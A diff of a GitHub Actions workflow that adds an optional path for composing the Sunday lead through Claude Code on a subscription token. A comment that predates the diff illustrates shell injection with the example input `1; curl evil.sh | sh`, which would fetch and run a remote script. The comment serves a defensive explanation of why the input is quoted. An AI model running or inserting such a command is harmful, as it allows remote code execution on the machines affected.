@@ -16,9 +16,13 @@ name: daily-edition
 # REQUIRED SECRETS — add under repo Settings → Secrets and variables → Actions:
 #   - NEXT_PUBLIC_SUPABASE_URL   — where the rows are written
 #   - SUPABASE_SERVICE_ROLE_KEY  — the only role allowed to write edition_items
-#   - ANTHROPIC_API_KEY          — the Sunday net-new Lead runs through the
-#                                  brain router; without it every Sunday build
-#                                  fails (Mon-Sat rotation needs no model)
+#   - ANTHROPIC_API_KEY          — Sunday Lead fallback via the brain router.
+#   - CLAUDE_CODE_OAUTH_TOKEN    — OPTIONAL (SA-095): from `claude setup-token`
+#                                  (Pro/Max). When present, the Sunday Lead
+#                                  composes through Claude Code on the
+#                                  founder's SUBSCRIPTION and the runner skips
+#                                  its API lead path — the pipeline's Anthropic
+#                                  bill drops to $0.
 # None has a default and none is optional. A missing Supabase secret arrives as
 # an empty string and the runner aborts before it generates anything, naming the
 # missing key. There is deliberately no `continue-on-error` anywhere in this
@@ -74,17 +78,44 @@ jobs:
       # `1; curl evil.sh | sh` would run as a second command; `"$EDITION_DAYS"`
       # is just a (rejected) argument. On `schedule` the inputs context is
       # empty, so `|| 1` supplies the nightly default of tomorrow's edition.
+      # SA-095: when the founder's subscription token is present, install
+      # Claude Code and compose any Sunday lead through it (subscription-
+      # billed); the runner then builds every kind EXCEPT lead. Without the
+      # token, the original API path runs unchanged. Secrets cannot appear in
+      # `if:` directly, so the token rides env and the shell branches.
+      - name: Install Claude Code (subscription lead path)
+        env:
+          HAS_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN != '' }}
+        run: |
+          set -euo pipefail
+          if [ "$HAS_TOKEN" = "true" ]; then
+            npm install -g @anthropic-ai/claude-code
+          else
+            echo "no CLAUDE_CODE_OAUTH_TOKEN — API lead path will be used"
+          fi
+
       - name: Build edition(s)
         env:
           NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
           SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
           EDITION_FROM: ${{ inputs.from }}
           EDITION_DAYS: ${{ inputs.days || 1 }}
         run: |
           set -euo pipefail
+          FROM_FLAG=""
           if [ -n "${EDITION_FROM:-}" ]; then
-            node scripts/edition/build.mjs --days="$EDITION_DAYS" --from="$EDITION_FROM"
+            FROM_FLAG="--from=$EDITION_FROM"
+          fi
+          if [ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}" ]; then
+            # Subscription path: Claude Code composes Sundays; the runner
+            # writes everything else. ANTHROPIC_API_KEY is deliberately
+            # UNSET for both so nothing silently bills the API.
+            unset ANTHROPIC_API_KEY
+            node scripts/edition/compose-lead-claude.mjs --days="$EDITION_DAYS" $FROM_FLAG
+            node scripts/edition/build.mjs --days="$EDITION_DAYS" $FROM_FLAG \
+              --kinds=rail,season,word,practice,strip,crossword,unscramble,quiz,gallery,prayer
           else
-            node scripts/edition/build.mjs --days="$EDITION_DAYS"
+            node scripts/edition/build.mjs --days="$EDITION_DAYS" $FROM_FLAG
           fi
